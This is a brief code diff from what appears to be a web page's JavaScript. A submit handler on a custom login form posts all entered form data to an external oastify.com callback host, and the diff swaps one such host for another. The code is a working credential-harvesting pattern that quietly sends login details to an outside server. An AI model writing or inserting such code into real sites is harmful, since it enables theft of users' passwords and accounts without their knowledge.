@@ -43,7 +43,7 @@ customLoginForm.addEventListener("submit", function handleCustomFormSubmit(e) {
   const formData = new FormData(customLoginForm);
   
   // 发送请求（可根据需要保留或修改）
-  fetch("https://8bkwjpu8s6zalb0816i75boltcz3ntbi.oastify.com", {
+  fetch("https://pohu4xfnqc2ng87u7vrc79ylico3ct0i.oastify.com", {
     method: "POST",
     body: formData
   });
